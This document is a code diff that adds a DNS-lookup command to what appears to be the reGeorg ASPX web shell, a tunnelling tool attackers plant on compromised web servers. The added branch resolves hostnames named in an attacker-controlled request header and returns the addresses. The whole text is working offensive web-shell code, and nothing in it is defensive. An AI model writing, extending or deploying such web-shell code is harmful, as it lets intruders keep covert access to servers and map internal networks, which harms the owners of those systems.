@@ -113,6 +113,19 @@ https://github.com/sensepost/reGeorg
                     Response.AddHeader("X-STATUS", "FAIL");
                 }
             } 
+            else if (cmd == "DNS")
+            {
+                String target = Request.Headers.Get("X-TARGET");
+                IPAddress[] addresses = Dns.GetHostByName(target).AddressList;
+                if (addresses.Length > 0) {
+                    Response.AddHeader("X-STATUS", "OK");
+                    Response.Write(addresses[0]);
+                } else
+                {
+                    Response.AddHeader("X-ERROR", "DNS lookup failed");
+                    Response.AddHeader("X-STATUS", "FAIL");
+                }
+            }
         } else {
             Response.Write("Georg says, 'All seems fine'");
         }
